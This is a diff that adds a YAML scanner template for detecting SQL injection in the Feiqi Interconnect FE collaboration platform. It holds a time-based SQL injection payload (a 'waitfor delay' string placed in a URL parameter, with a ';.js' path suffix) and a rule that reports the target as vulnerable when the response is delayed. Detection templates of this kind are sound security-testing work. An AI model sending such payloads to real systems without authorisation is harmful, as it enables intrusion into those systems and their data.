@@ -1,0 +1,11 @@
+name: 飞企互联-FE业务协作平台-ajax_codewidget39-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:5%27--+
+    expression:
+      status: 200
+      sleep: 5
